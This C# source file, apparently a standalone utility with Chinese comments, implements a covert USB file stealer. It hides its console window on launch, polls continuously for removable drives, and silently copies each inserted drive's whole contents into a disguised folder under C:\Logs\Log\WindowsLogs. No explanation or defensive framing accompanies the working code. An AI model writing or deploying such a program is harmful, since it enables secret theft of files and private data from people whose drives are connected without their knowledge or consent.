using System;
using System.IO;
using System.Collections.Generic;
using System.Threading;

//Powered By Yanda2008
//爱在夕阳下·御风前行 
//最后修改日期2023年/11月/09日
class LiberatorsX
{
    static HashSet<string> copiedDrives = new HashSet<string>();
    static bool isCopying = false;

    // 隐藏控制台
    const int SW_HIDE = 0;
    [System.Runtime.InteropServices.DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    // 主程序入口
    static void Main(string[] args)
    {
        // 隐藏控制台
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);

        // 持续监测可移动驱动器
        while (true)
        {
            var drives = DriveInfo.GetDrives();
            bool newDriveFound = false;

            foreach (var drive in drives)
            {
                if (IsRemovableDrive(drive.Name) && !copiedDrives.Contains(drive.Name))
                {
                    string currentDateTime = DateTime.Now.ToString("yyyyMMddHHmmss"); // 时间
                    string destinationDirectory = Path.Combine("C:\\Logs\\Log\\WindowsLogs\\Logs\\1", currentDateTime);
                    string sourceDirectory = drive.RootDirectory.FullName;

                    // 如果目标文件夹不存在，创建
                    if (!Directory.Exists(destinationDirectory))
                    {
                        Directory.CreateDirectory(destinationDirectory);
                    }

                    isCopying = true;
                    // 复制文件夹
                    if (CopyDirectory(sourceDirectory, destinationDirectory))
                    {
                        copiedDrives.Add(drive.Name);
                        newDriveFound = true;
                        isCopying = false;
                    }
                    else
                    {
                        isCopying = false;
                        break;
                    }
                }
            }

            // 如果没有找到新的驱动器并且不在复制中，等待5秒钟再继续检查
            if (!newDriveFound && !isCopying)
            {
                Thread.Sleep(5000);
            }
        }
    }

    // 复制文件夹
    static bool CopyDirectory(string sourceDirectory, string destinationDirectory)
    {
        try
        {
            Directory.CreateDirectory(destinationDirectory);
            foreach (string file in Directory.GetFiles(sourceDirectory))
            {
                string destinationFile = Path.Combine(destinationDirectory, Path.GetFileName(file));
                File.Copy(file, destinationFile, true);
            }
            foreach (string subDirectory in Directory.GetDirectories(sourceDirectory))
            {
                string destinationSubDirectory = Path.Combine(destinationDirectory, Path.GetFileName(subDirectory));
                CopyDirectory(subDirectory, destinationSubDirectory);
            }
            return true;
        }
        catch (IOException)
        {
            return false;
        }
    }

    // 判断是否为可移动驱动器
    static bool IsRemovableDrive(string path)
    {
        DriveInfo drive = new DriveInfo(Path.GetPathRoot(path));
        return drive.DriveType == DriveType.Removable;
    }
}
